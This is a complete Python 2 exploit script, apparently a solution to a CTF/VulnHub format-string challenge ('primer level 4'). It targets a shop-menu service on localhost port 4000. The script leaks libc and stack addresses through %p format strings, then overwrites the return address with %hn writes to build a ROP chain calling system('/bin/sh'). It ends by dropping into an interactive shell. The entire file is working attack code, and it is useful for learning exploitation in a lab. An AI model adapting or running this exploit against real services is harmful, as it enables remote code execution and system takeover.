import socket
import struct
import telnetlib
import sys

def tcp_connect(ip, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))

	return s

def recv_until(s, string):
	received = ""

	while string not in received:
		received += s.recv(1)

	return received

packet_index = 1

def add_format_string(format_string, junk_char):
	global packet_index
	#print packet_index
	recv_until(s, "Your choice:")
	s.send("1\n")
	recv_until(s, "Would you like to buy apple (1) or banana (2)?:")
	s.send("2\n")
	recv_until(s, "Enter quantity:")
	s.send("-1\n")
	recv_until(s, "Would you like to specify the shipping address? (Y/N)")
	s.send("Y\n")
	s.send(junk_char*64 + format_string + "\n")
	recv_until(s, "Your choice:")
	s.send("3\n")
	recv_until(s, "Enter index of packet to change:")
	s.send(str(packet_index) + "\n")
	recv_until(s, "Enter new label:")
	s.send("A"*10 + "\n")
	packet_index += 1

s = tcp_connect('127.0.0.1', 4000)

add_format_string("%13$p%6$p%8$p", "X")
recv_until(s, "Your choice:")
s.send("2\n")
response = recv_until(s, "X"*64).split("X"*64)[0].split("65531|")[1]
libc = int(response.split("0x")[1], 16) - 0x20830
pop_rdi_ret = libc + 0x21102
bin_sh = libc + 0x18cd57
libc_system = libc + 0x45390
return_addr_location = int(response.split("0x")[2], 16) + 0x8
addr_we_modify = int(response.split("0x")[3], 16)

print response
print "Libc:", hex(libc)
print "Return address location:", hex(return_addr_location)
print "Original address we modify:", hex(addr_we_modify)

add_format_string("%" + str(return_addr_location & 0xffff) +"c%6$hn", "X")
add_format_string("%" + str(pop_rdi_ret & 0xffff) +"c%8$hn", "X")
add_format_string("%" + str((return_addr_location + 2) & 0xffff) +"c%6$hn", "X")
add_format_string("%" + str((pop_rdi_ret >> 16) & 0xffff) +"c%8$hn", "X")
add_format_string("%" + str((return_addr_location + 4) & 0xffff) +"c%6$hn", "X")
add_format_string("%" + str((pop_rdi_ret >> 32) & 0xffff) +"c%8$hn", "Y")
add_format_string("%9$p", "Z")

add_format_string("%" + str((return_addr_location + 8) & 0xffff) +"c%6$hn", "X")
add_format_string("%" + str(bin_sh & 0xffff) +"c%8$hn", "X")
add_format_string("%" + str((return_addr_location + 8 + 2) & 0xffff) +"c%6$hn", "X")
add_format_string("%" + str((bin_sh >> 16) & 0xffff) +"c%8$hn", "X")
add_format_string("%" + str((return_addr_location + 8 + 4) & 0xffff) +"c%6$hn", "X")
add_format_string("%" + str((bin_sh >> 32) & 0xffff) +"c%8$hn", "I")
add_format_string("%10$p", "J")

add_format_string("%" + str((return_addr_location + 16) & 0xffff) +"c%6$hn", "X")
add_format_string("%" + str(libc_system & 0xffff) +"c%8$hn", "X")
add_format_string("%" + str((return_addr_location + 16 + 2) & 0xffff) +"c%6$hn", "X")
add_format_string("%" + str((libc_system >> 16) & 0xffff) +"c%8$hn", "X")
add_format_string("%" + str((return_addr_location + 16 + 4) & 0xffff) +"c%6$hn", "X")
add_format_string("%" + str((libc_system >> 32) & 0xffff) +"c%8$hn", "P")
add_format_string("%11$p", "Q")

recv_until(s, "Your choice:")
s.send("2\n")

if int(recv_until(s, "Z"*64).split("Z"*64)[0].split("Y"*64)[1].split("65531|")[1], 16) == pop_rdi_ret:
	print "[+] 'pop rdi ; ret' gadget @ " + hex(pop_rdi_ret) + " successfully written to return address @ " + hex(return_addr_location)
else:
	print "[-] Failed to write 'pop rdi ; ret' gadget to return address"

if int(recv_until(s, "J"*64).split("J"*64)[0].split("I"*64)[1].split("65531|")[1], 16) == bin_sh:
	print "[+] '/bin/sh' @ " + hex(bin_sh) + " successfully written to return address + 8 @ " + hex(return_addr_location + 8)
else:
	print "[-] Failed to write '/bin/sh' to return address + 8"

if int(recv_until(s, "Q"*64).split("Q"*64)[0].split("P"*64)[1].split("65531|")[1], 16) == libc_system:
	print "[+] Libc system @ " + hex(libc_system) + " successfully written to return address + 16 @ " + hex(return_addr_location + 16)
else:
	print "[-] Failed to write libc system to return address + 16"

recv_until(s, "|\n")
print "[+] Enjoy your shell"

t = telnetlib.Telnet()
t.sock = s
t.interact()

#http://www.arti-sec.com/article/format-string-exploit-example-64bitprimer-ctf-vulnhubcom-level-4
